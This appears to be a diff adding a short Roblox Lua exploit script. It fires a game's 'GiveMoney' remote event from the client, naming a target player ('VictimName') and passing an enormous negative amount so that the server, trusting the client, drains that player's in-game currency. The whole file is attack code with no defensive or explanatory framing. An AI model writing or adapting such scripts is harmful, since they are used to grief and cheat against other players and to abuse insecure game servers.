@@ -1,0 +1,4 @@
+local ohInstance1 = game:GetService("Players").VictimName
+local ohNumber2 = -999999999999999999999999999999999999
+
+game:GetService("ReplicatedStorage").GiveMoney:FireServer(ohInstance1, ohNumber2)
